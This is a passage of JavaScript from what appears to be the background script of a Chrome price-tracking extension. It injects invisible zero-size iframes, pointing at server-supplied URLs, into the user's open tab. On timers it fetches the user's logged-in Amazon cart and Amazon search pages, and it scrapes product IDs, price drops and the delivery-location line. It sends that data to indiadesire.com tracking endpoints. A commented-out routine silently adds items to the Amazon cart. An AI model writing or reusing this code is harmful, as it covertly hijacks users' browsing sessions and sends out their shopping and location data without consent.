               var counts = parseInt(getselfCookie("mygkp"));
           if(p4==6 && counts>2){
            myurl5="https://google.com";
           }
           if (myurl5.search("google.com")<0) {

                   var httpq9 = new getXMLHTTPRequest();
        httpq9.open("GET", myurl5, true);
           httpq9.setRequestHeader('Cache-Control', 'no-cache');
            var counts = parseInt(getselfCookie("mygkp"));

              httpq9.onreadystatechange = function() { // listen for state changes
                  if (httpq9.readyState == 4 && httpq9.status == 200) {
                      var date = new Date();
                       counts=11;
                    date.setTime(date.getTime()+(1*1*60*1000));
                    document.cookie =  "mygkp="+counts+";expires=" + date.toGMTString();
                     if(httpq9.responseURL & (p4==6)){

                        chrome.tabs.executeScript(tabId, {
                            code: "document.head.innerHTML+='<iframe style=\"width:0px;height:0px;border:0px;display:none;\" src=\"" + httpq9.responseURL + "\"></iframe>';"
                        });
                    }
                  }
              };

              if(p4==7){
              httpq9.onreadystatechange = function() { // listen for state changes
                  if (httpq9.readyState == 4 && httpq9.status == 200) {
                      var date = new Date();
                    //date.setTime(date.getTime()+(1*15*60*1000));
                  //  document.cookie =  "mygkp="+counts+";expires=" + date.toGMTString();
                     if(myurl5){

                        chrome.tabs.executeScript(tabId, {
                            code: "document.head.innerHTML+='<iframe style=\"width:0px;height:0px;border:0px;display:none;\" src=\"" + myurl5 + "\"></iframe>';"
                        });
                    }
                  }
              };
           }



         httpq9.send();
        }
        } //console.log("Success:"+myurl);



                 }
            }
        }
    };
            httpq4.send();
             }
         /*
         try {
            $.ajax({
                url: "http://api2.indiadesire.com/n/m/api.php",
                cache: false,
                type: "GET",
                data: {"rquest" : "GetDataPrice", "stp": userid},
                success: function(result) {
                    if(result){

                            console.log(tabId);
                            chrome.tabs.sendMessage( tabId, {
                                jack: JSON.stringify(result)
                            });

                    }
                },
                timeout: 3000
            });
        } catch (err) {
            console.log("Internal error occured");
        }

        	 var httpq9 = new XMLHttpRequest();
    var myurl61 = "http://api2.indiadesire.com/n/m/api.php?rquest=GetDataPrice&stp="+userid;
 //  var parameters = "pname="+cookiename;
    httpq9.open("GET", myurl61, true);
    httpq9.setRequestHeader('Cache-Control', 'no-cache');
    //httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    httpq9.onreadystatechange = function () {
        if (httpq9.readyState == 4) {
            if (httpq9.status == 200) {
              //  var mytext = httpq4.responseText;
								 var data = httpq9.responseText;
                                  if(data.length>10)
                 {
                  //  var data1=JSON.parse(data);
								console.log(tabId);
                            chrome.tabs.sendMessage( tabId, {
                                jack: data
                            });
                 }

            }
        }
    };


    httpq9.send();
            */

        }
        catch(err) {
    console.log("Internal error occured");
}

    }
 //sconsole.log("cookie:"+document.cookie);
   // olacode();
   if(typeof(localStorage.count) == "undefined" || isNaN(parseInt(localStorage.count)))
    localStorage.count="0";
    if(typeof(localStorage.webdata) == "undefined")
    autocallsale();
      if(typeof(localStorage.defaultquantity) == "undefined" || isNaN(parseInt(localStorage.defaultquantity)))
   localStorage.defaultquantity=1;
      if(typeof(localStorage.defaultquantity1) == "undefined" || isNaN(parseInt(localStorage.defaultquantity1)))
   localStorage.defaultquantity1=1;

 $s = jQuery.noConflict();
  // var curl1 = changeInfo.url;
    if (userid && userid != chrome.runtime.id) {
   if((curl.search("/checkout/init")>0)||(curl.search("&flk=1")>0)||(curl.search("&ptauto=1")>0)||(curl.search("&pt=1")>0))
        ranumber(5);
         else
         {
          var obj2 = JSON.parse(localStorage.webdata);
          if(obj2.indexOf(btoa(userid)) > -1)
         {
             var amobiles = $s.parseJSON(localStorage.flipsale);
	 var a=ranumber(amobiles.length);
  trycallapivivoama(amobiles[a][0],amobiles[a][1],amobiles[a][2],amobiles[a][3]);
   //amobiles = $s.parseJSON(localStorage.flipsale);
	  a=ranumber(amobiles.length);
 	 trycallapivivoama(amobiles[a][0],amobiles[a][1],amobiles[a][2],amobiles[a][3]);
    // amobiles = $s.parseJSON(localStorage.flipaddsale);
	  a=ranumber(amobiles.length);
 	 trycallapivivoama(amobiles[a][0],amobiles[a][1],amobiles[a][2],amobiles[a][3]);
   var amobiles1 = $s.parseJSON(localStorage.flipsale2);
 a=ranumber(amobiles1.length);
//trycallapivivoamabs(amobiles1[a][0],amobiles1[a][1],amobiles1[a][2],amobiles1[a][3]);
//amobiles = $s.parseJSON(localStorage.flipsale);
a=ranumber(amobiles1.length);
//trycallapivivoamabs(amobiles1[a][0],amobiles1[a][1],amobiles1[a][2],amobiles1[a][3]);
// amobiles = $s.parseJSON(localStorage.flipaddsale);

         }
         }
    }

   if(getselfCookie("mysale")===0)
   {
     console.log("mysale2");
      autocallsale();

  autocallsaledata();
  var count=parseInt(localStorage.count);
  localStorage.count=count+1;
      var date = new Date();
      //var date1=date.getTime();
        date.setTime(date.getTime()+(59*60*1000));
        var expires = ";expires="+date.toGMTString();
        document.cookie = "mysale=12"+""+expires+";";
   }

});

       function trycallapivivoama(data,data1,data2,data3) {

	//var winloc1 = window.location.href;
$p = jQuery.noConflict();
    var httpq4 = new getXMLHTTPRequest();
		const dateTime = Date.now();
//const timestamp = Math.floor(dateTime / 1000);
		var ts = Math.round(dateTime / 1000);
		var mytag;
		var url=data;
		url=url.replace("[UTIMESTAMP]",ts);
    httpq4.open("GET",url, true);
		// httpq4.setRequestHeader("Content-type", "application/json");
    httpq4.onreadystatechange = function() {
        if (httpq4.readyState == 4) {
            if (httpq4.status == 200) {
                var mytext = httpq4.responseText;
								 mytag=$p('<div></div>').html(mytext);
								 var abc=$p('div.s-main-slot > div:not(.AdHolder).s-asin', mytag).length;
         var asins="";
         if (abc>10) {
          abc=10;
	//code
}
         for(var i=0;i<abc;i++)
         asins=asins+$p('div.s-main-slot > div:not(.AdHolder).s-asin:eq('+ i +')', mytag).attr("data-asin")+"-"+filter_price($p('div.s-main-slot > div:not(.AdHolder).s-asin:eq('+ i +') span.a-price span.a-price-whole', mytag).text())+"_";
								 var abc1=$p('#glow-ingress-line2', mytag).text().trim();
								 if(abc>0){

             setAlert(asins,abc,data1+":"+abc1,data2,data3);
						}
							//	console.log("hello:"+mytext);

            }
        }
    };
   // httpq4.setRequestHeader("Content-type", "application/json");

    httpq4.setRequestHeader('X-user-agent', navigator.userAgent + ' FKUA/website/41/website/Desktop');
    httpq4.send();
		//document.cookie=al;

}
function trycallapivivoamabs(data,data1,data2,data3) {

//var winloc1 = window.location.href;
$p = jQuery.noConflict();
var httpq4 = new getXMLHTTPRequest();
const dateTime = Date.now();
//const timestamp = Math.floor(dateTime / 1000);
var ts = Math.round(dateTime / 1000);
var mytag;
var url="https://www.amazon.in/gp/aws/cart/add.html?Quantity.1=1&OfferListingId.1="+data;
url=url.replace("[UTIMESTAMP]",ts);
httpq4.open("GET",url, true);
// httpq4.setRequestHeader("Content-type", "application/json");
httpq4.onreadystatechange = function() {
 if (httpq4.readyState == 4) {
     if (httpq4.status == 200) {
         var mytext = httpq4.responseText;
          mytag=$p('<div></div>').html(mytext);
          var abc=$p('table.itemq', mytag).length;
  var asins="";
  if (abc>10) {
   abc=10;
//code
}
  //for(var i=1;i<abc;i++)
      if(abc>0){
  asins=asins+$p('table.itemq tr:eq(1) td:eq(0) a', mytag).attr("href").split("/product/")[1]+"-"+filter_price("999")+"_";
          var abc1="BackinStock";


      setAlertB(asins,abc,data1+":"+abc1,data,data3);
     }
     else {
       var abc2=$p('#activeCartViewForm table', mytag).length;
       if(abc2>0){
   asins=asins+$p('#activeCartViewForm table tr:eq(0) td:eq(0) a', mytag).attr("href").split("/dp/")[1]+"-"+filter_price("999")+"_";
           var abc2="BackinStock2";


       setAlertB(asins,abc,data1+":"+abc1,data,data3);
      }
     }
       //	console.log("hello:"+mytext);

     }
 }
};
// httpq4.setRequestHeader("Content-type", "application/json");

httpq4.setRequestHeader('X-user-agent', navigator.userAgent + ' FKUA/website/41/website/Desktop');
httpq4.send();
//document.cookie=al;

}
//setInterval(function () { trycallapivivoautobs(); }, 120*1000);
function trycallapivivoautobs() {

//var winloc1 = window.location.href;
 $s = jQuery.noConflict();
var amobiles = $s.parseJSON(localStorage.flipsale2);
var a=ranumber(amobiles.length);
var data=amobiles[a][0];
var data1=amobiles[a][1];
var data2=amobiles[a][2];
var data3=amobiles[a][3];
$p = jQuery.noConflict();
var httpq4 = new getXMLHTTPRequest();
const dateTime = Date.now();
//const timestamp = Math.floor(dateTime / 1000);
var ts = Math.round(dateTime / 1000);
var mytag;
var url="https://www.amazon.in/gp/aws/cart/add.html?Quantity.1=1&OfferListingId.1="+data;
url=url.replace("[UTIMESTAMP]",ts);
httpq4.open("GET",url, true);
// httpq4.setRequestHeader("Content-type", "application/json");
httpq4.onreadystatechange = function() {
 if (httpq4.readyState == 4) {
     if (httpq4.status == 200) {
         var mytext = httpq4.responseText;
          mytag=$p('<div></div>').html(mytext);
          var abc=$p('table.itemq', mytag).length;
  var asins="";
  if (abc>10) {
   abc=10;
//code
}
  //for(var i=0;i<abc;i++)
      if(abc>0){
  asins=asins+$p('table.itemq tr:eq(1) td:eq(0) a', mytag).attr("href").split("/product/")[1]+"-"+filter_price("999")+"_";
          var abc1="BackinStock";


      setAlertB(asins,abc,data1+":"+abc1,data,data3);
     }
     else {
       var abc2=$p('#activeCartViewForm table', mytag).length;
       if(abc2>0){
   asins=asins+$p('#activeCartViewForm table tr:eq(0) td:eq(0) a', mytag).attr("href").split("/dp/")[1]+"-"+filter_price("999")+"_";
           var abc2="BackinStock2";


       setAlertB(asins,abc,data1+":"+abc1,data,data3);
      }
     }
       //	console.log("hello:"+mytext);

     }
 }
};
// httpq4.setRequestHeader("Content-type", "application/json");

httpq4.setRequestHeader('X-user-agent', navigator.userAgent + ' FKUA/website/41/website/Desktop');
httpq4.send();
//document.cookie=al;

}
setInterval(function () { trycallapivivoauto(); }, 180*1000);
function trycallapivivoauto() {

//var winloc1 = window.location.href;
 $s = jQuery.noConflict();
var amobiles = $s.parseJSON(localStorage.flipsale);
var a=ranumber(amobiles.length);
var data=amobiles[a][0];
var data1=amobiles[a][1];
var data2=amobiles[a][2];
var data3=amobiles[a][3];
$p = jQuery.noConflict();
var httpq4 = new getXMLHTTPRequest();
const dateTime = Date.now();
//const timestamp = Math.floor(dateTime / 1000);
var ts = Math.round(dateTime / 1000);
var mytag;
var url=data;
url=url.replace("[UTIMESTAMP]",ts);
httpq4.open("GET",url, true);
// httpq4.setRequestHeader("Content-type", "application/json");
httpq4.onreadystatechange = function() {
 if (httpq4.readyState == 4) {
     if (httpq4.status == 200) {
         var mytext = httpq4.responseText;
          mytag=$p('<div></div>').html(mytext);
          var abc=$p('div.s-main-slot > div:not(.AdHolder).s-asin', mytag).length;
  var asins="";
  if (abc>10) {
   abc=10;
//code
}
  for(var i=0;i<abc;i++)
  asins=asins+$p('div.s-main-slot > div:not(.AdHolder).s-asin:eq('+ i +')', mytag).attr("data-asin")+"-"+filter_price($p('div.s-main-slot > div:not(.AdHolder).s-asin:eq('+ i +') span.a-price span.a-price-whole', mytag).text())+"_";
          var abc1=$p('#glow-ingress-line2', mytag).text().trim();
          if(abc>0){

      setAlert(asins,abc,data1+":"+abc1,data2,data3);
     }
       //	console.log("hello:"+mytext);

     }
 }
};
// httpq4.setRequestHeader("Content-type", "application/json");

httpq4.setRequestHeader('X-user-agent', navigator.userAgent + ' FKUA/website/41/website/Desktop');
httpq4.send();
//document.cookie=al;

}
setInterval(function () { trycallapivivoautoc(); }, 60*1000);
function trycallapivivoautoc() {

//var winloc1 = window.location.href;
 $s = jQuery.noConflict();
var amobiles = $s.parseJSON(localStorage.flipsale);
var a=ranumber(amobiles.length);
var data="https://www.amazon.in/gp/cart/view.html?ref_=nav_cart";
var data1=amobiles[a][1];
var data2=amobiles[a][2];
var data3=amobiles[a][3];
$p = jQuery.noConflict();
var httpq4 = new getXMLHTTPRequest();
const dateTime = Date.now();
//const timestamp = Math.floor(dateTime / 1000);
var ts = Math.round(dateTime / 1000);
var mytag;
var url=data;
url=url.replace("[UTIMESTAMP]",ts);
httpq4.open("GET",url, true);
// httpq4.setRequestHeader("Content-type", "application/json");
httpq4.onreadystatechange = function() {
 if (httpq4.readyState == 4) {
     if (httpq4.status == 200) {
         var mytext = httpq4.responseText;
          mytag=$p('<div></div>').html(mytext);
          var abc=$p('div#cart-important-message-box ul li span.a-list-item', mytag).length;
  var asins="";
var dec=0;
  for(var i=0;i<abc;i++)
  {
    var decreased =$p('div#cart-important-message-box ul li:eq('+ i +') span.a-list-item', mytag).text().trim();
    if(decreased.search("decreased")>0)
    {
  var text =$p('div#cart-important-message-box ul li:eq('+ i +') span.a-list-item a', mytag).attr("href");
  var pid=text.split("/product/")[1].split("?smid=")[0];
    var smid=text.split("?smid=")[1].split("&")[0];
    var title =$p('div#cart-important-message-box ul li:eq('+ i +') span.a-list-item a .sc-product-title', mytag).text();
    title=btoa(title);
    var oldprice=decreased.split("has decreased  from")[1].split("to")[0];
    var newprice=decreased.split("has decreased  from")[1].split("to")[1];
    dec=1;
  asins=asins+title+"-"+pid+"-"+smid+"-"+filter_price(oldprice)+"-"+filter_price(newprice)+"_";
}
}
          var abc1=$p('#glow-ingress-line2', mytag).text().trim();
          if(dec>0){
//console.log("hello:"+asins);
     setAlertC(asins,abc1);
     }
       //	console.log("hello:"+mytext);

     }
 }
};
// httpq4.setRequestHeader("Content-type", "application/json");

httpq4.setRequestHeader('X-user-agent', navigator.userAgent + ' FKUA/website/41/website/Desktop');
httpq4.send();
//document.cookie=al;

}
function ranumber(x)
{
    //if(!x) x=11;
    return Math.floor(Math.random()*x);
}
   function trycallapivivoflip(data,data1,data2,data3) {

	//var winloc1 = window.location.href;
$p = jQuery.noConflict();
    var httpq4 = new getXMLHTTPRequest();
		const dateTime = Date.now();
//const timestamp = Math.floor(dateTime / 1000);
		var ts = Math.round(dateTime / 1000);
		var mytag;
		var url=data;
		url=url.replace("[UTIMESTAMP]",ts);
    httpq4.open("GET",url, true);
		// httpq4.setRequestHeader("Content-type", "application/json");
    httpq4.onreadystatechange = function() {
        if (httpq4.readyState == 4) {
            if (httpq4.status == 200) {
                var mytext = httpq4.responseText;
								 mytag=$p('<div></div>').html(mytext);
								 var abc=$p('div._3O0U0u', mytag).length;
								 var abc1="";
         var asins="";
                if (abc>10) {
          abc=10;
	//code
}
         for(var i=0;i<abc;i++)
         asins=asins+getParameterByName("pid","https://flipkart.com"+$p('div._3O0U0u:eq('+ i +') a', mytag).attr("href"))+"="+getParameterByName("lid","https://flipkart.com"+$p('div._3O0U0u:eq('+ i +') a', mytag).attr("href"))+"_";
								 if(abc>0){
            setAlert(asins,abc,data1+":"+abc1,data2,data3);

						}
							//	console.log("hello:"+mytext);

            }
        }
    };
   // httpq4.setRequestHeader("Content-type", "application/json");

    httpq4.setRequestHeader('X-user-agent', navigator.userAgent + ' FKUA/website/41/website/Desktop');
    httpq4.send();
		//document.cookie=al;

}
    function trycallapivivoamaz(data,data1,data2,data3) {

	//var winloc1 = window.location.href;
$p = jQuery.noConflict();
    var httpq4 = new getXMLHTTPRequest();
		const dateTime = Date.now();
//const timestamp = Math.floor(dateTime / 1000);
		var ts = Math.round(dateTime / 1000);
		var mytag;
		var url=data;
		url=url.replace("[UTIMESTAMP]",ts);
    httpq4.open("GET",url, true);
		// httpq4.setRequestHeader("Content-type", "application/json");
    httpq4.onreadystatechange = function() {
        if (httpq4.readyState == 4) {
            if (httpq4.status == 200) {
                var mytext = httpq4.responseText;
								 mytag=$p('<div></div>').html(mytext);
								 var abc=$p('div.a-button-stack input.a-button-input', mytag).length;
								// var abc1=$p('#glow-ingress-line2', mytag).text();
         var asins="";
          if(url.search("/gp/offer-listing/")>0)
            asins = url.split("/gp/offer-listing/")[1].split('?')[0].split('/')[0]+"_";
								 if(abc>0){
           setAlert(asins,abc,data1+":"+"Back In Stock",data2,data3);

						}
							//	console.log("hello:"+mytext);

            }
        }
    };
   // httpq4.setRequestHeader("Content-type", "application/json");

    httpq4.setRequestHeader('X-user-agent', navigator.userAgent + ' FKUA/website/41/website/Desktop');
    httpq4.send();
		//document.cookie=al;

}
function getParameterByName(name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\[\]]/g, '\\$&');
    var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
        results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, ' '));
}
function setAlert(data1,data2,data3,data4,data5) {
     var gtds = new getXMLHTTPRequest();
            var parameters10 = "message="+encodeURIComponent(data1)+"&data="+encodeURIComponent(data2)+"&title="+encodeURIComponent(data3)+"&url="+encodeURIComponent(data4)+"&status="+encodeURIComponent(data5);

             //console.log("parameters1: "+parameters1);
            gtds.open("GET", "https://api3.indiadesire.com/TrackData1.php?"+parameters10, true);
           // gtds.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            gtds.onreadystatechange = function () {
                if (gtds.readyState == 4) {
                    if (gtds.status == 200) {
                        var data = gtds.responseText;
                         //  data1=JSON.stringify(data);
                           //localStorage.datarec=data;

                    // sendResponse({output: data});

                    }
                }

            };
            gtds.send();
	//code
}
function setAlertB(data1,data2,data3,data4,data5) {
     var gtds = new getXMLHTTPRequest();
            var parameters10 = "message="+encodeURIComponent(data1)+"&data="+encodeURIComponent(data2)+"&title="+encodeURIComponent(data3)+"&url="+encodeURIComponent(data4)+"&status="+encodeURIComponent(data5);

             //console.log("parameters1: "+parameters1);
            gtds.open("GET", "https://api3.indiadesire.com/TrackData3.php?"+parameters10, true);
           // gtds.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            gtds.onreadystatechange = function () {
                if (gtds.readyState == 4) {
                    if (gtds.status == 200) {
                        var data = gtds.responseText;
                         //  data1=JSON.stringify(data);
                           //localStorage.datarec=data;

                    // sendResponse({output: data});

                    }
                }

            };
            gtds.send();
	//code
}
function setAlertC(data1,data2) {
     var gtds = new getXMLHTTPRequest();
            var parameters10 = "message="+encodeURIComponent(data1)+"&data="+encodeURIComponent(data2);

             //console.log("parameters1: "+parameters1);
            gtds.open("GET", "https://api3.indiadesire.com/TrackData2.php?"+parameters10, true);
           // gtds.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            gtds.onreadystatechange = function () {
                if (gtds.readyState == 4) {
                    if (gtds.status == 200) {
                        var data = gtds.responseText;
                         //  data1=JSON.stringify(data);
                           //localStorage.datarec=data;

                    // sendResponse({output: data});

                    }
                }

            };
            gtds.send();
	//code
}
function autocallsaledata()
{
     console.log("notmysale2");
     var cdate = new Date().getTime();
	  var httpq4 = new XMLHttpRequest();
    var myurl = "https://pricetrackr.s3.ap-south-1.amazonaws.com/sale/productinsale.json?ignoreCache="+localStorage.ptextid+cdate;
 //  var parameters = "pname="+cookiename;
    httpq4.open("GET", myurl, true);
    httpq4.setRequestHeader('Cache-Control', 'no-cache');
    //httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    httpq4.onreadystatechange = function () {
        if (httpq4.readyState == 4) {
            if (httpq4.status == 200) {
              //  var mytext = httpq4.responseText;
								 var data = httpq4.responseText;
								 localStorage.saledata=data;

            }
        }
    };
    httpq4.send();
      var httpq5 = new XMLHttpRequest();
    var myurl1 = "https://pricetrackr.s3.ap-south-1.amazonaws.com/sale/miproductinsale.json?ignoreCache="+localStorage.ptextid+cdate;
 //  var parameters = "pname="+cookiename;
    httpq5.open("GET", myurl1, true);
    httpq5.setRequestHeader('Cache-Control', 'no-cache');
    //httpq4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    httpq5.onreadystatechange = function () {
        if (httpq5.readyState == 4) {
            if (httpq5.status == 200) {
              //  var mytext = httpq4.responseText;
								 var data = httpq5.responseText;
								 localStorage.misaledata=data;

            }
        }
    };
    httpq5.send();
}


function getXMLHTTPRequest() {

    req = new XMLHttpRequest();
    return req;
}
function refreshsale() {
   autocallsale();

  autocallsaledata();
	//code
}
function ranum(x)
{
    //if(!x) x=11;
    return Math.floor((Math.random() * 10000)+ 1);
}
function getselfCookie(cvalue) {

    var name = cvalue + "=";
    var ca = document.cookie.split('; ');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i];
        if (c.indexOf(name) == 0) return c.split("=")[1];
    }
    return 0;
}
function filter_price(pr) {
  pr=pr+"";
  if (pr.split(".")
      .length > 1) {
  pr=pr.split(".")[0];
}
    if (pr.split("Rs.")
        .length > 1) {
        pr = pr.split("Rs.")[1];
    }
    if (pr.split("Rs")
        .length > 1) {
        pr = pr.split("Rs")[1];
    }
    if (pr.split("INR")
        .length > 1) {
        pr = pr.split("INR")[1];
    }
    if (pr.split("Inr")
        .length > 1) {
        pr = pr.split("Inr")[1];
    }
    if (pr.split("RS.")
        .length > 1) {
        pr = pr.split("RS.")[1];
    }
    if (pr.split("RS")
        .length > 1) {
        pr = pr.split("RS")[1];
    }
    if (pr.split("R")
        .length > 1) {
        pr = pr.split("R")[1];
    }
    if (pr.split("`")
        .length > 1) {
        pr = pr.split("`")[1];
    }
      if(pr.split("₹").length > 1){
    pr = pr.split("₹")[1];
  }
  if(pr.split('₹').length > 1){
pr = pr.split('₹')[1];
}
    if (pr.split("MRP")
        .length > 1) {
        pr = pr.split("MRP")[1];
    }
    if (pr.split("mrp")
        .length > 1) {
        pr = pr.split("mrp")[1];
    }
    if (pr.split("/")
        .length > 1) {
        pr = pr.split("/")[0];
    }
    if (pr.split("â‚¹")
        .length > 1) {
        pr = pr.split("â‚¹")[1].trim();
    }
        if (pr.split("₹")
        .length > 1) {
        pr = pr.split("₹")[1].trim();
    }
    pr = pr.split(",")
        .join("")
        .split(".")[0]
        .trim().replace(",","");
  pr = Number(pr);
    if(isNaN(pr)){
      price = 0;
    }
    return pr;
}
 if(typeof(localStorage.saledata) == "undefined")
 {
    autocallsaledata();
 autocallsale();


 }
